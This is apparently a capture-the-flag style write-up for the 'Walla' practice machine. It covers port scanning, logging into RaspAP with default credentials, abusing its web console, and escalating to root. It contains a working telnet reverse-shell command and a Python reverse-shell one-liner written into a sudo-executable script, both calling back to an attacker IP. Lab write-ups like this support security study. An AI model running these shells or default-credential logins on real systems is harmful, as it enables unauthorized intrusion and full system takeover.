---
description: Pg Practice Walla writeup
---

# Walla

## Nmap

```
sudo nmap 192.168.233.97 -p- -sS -sV

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8091/tcp  open  http       lighttpd 1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Connecting to port 8091 asks credentials for "RaspAP". Which is Debian based software for wireless routers.

![](<../../../.gitbook/assets/image (967).png>)

Looking up the default credentials we can log in with `admin:secret`.

![http://192.168.233.97:8091/](<../../../.gitbook/assets/image (968).png>)

Checking the settings we are running version 2.5. PoC exist here:[https://raw.githubusercontent.com/lb0x/cve-2020-24572/master/raspap\_pwn.py](https://raw.githubusercontent.com/lb0x/cve-2020-24572/master/raspap\_pwn.py). However I was unable to get code execution from this.

Looking at the exploit code we can see it is trying to interact with webconsole.php

![](<../../../.gitbook/assets/image (1427).png>)

We can manually browse to this at: [http://192.168.233.97:8091/includes/webconsole.php](http://192.168.233.97:8091/includes/webconsole.php).

![](<../../../.gitbook/assets/image (969).png>)

This along with telnet running on the target machine we can obtain a proper reverse shell:

```
mknod a p && telnet 192.168.49.233 443 0<a | /bin/sh 1>a
```

![](<../../../.gitbook/assets/image (970).png>)

![](<../../../.gitbook/assets/image (971) (1).png>)

Running linpeas.sh on the target reveals the following interesting information:

![](<../../../.gitbook/assets/image (972) (1).png>)

As www-data we can delete the file /home/walter/wifi\_reset.py and replace it with a python reverse shell of the same name:

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.233",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' > /home/walter/wifi_reset.py
```

Then execute with `sudo` as root:

```
sudo /usr/bin/python /home/walter/wifi_reset.py
```

![](<../../../.gitbook/assets/image (973) (1).png>)
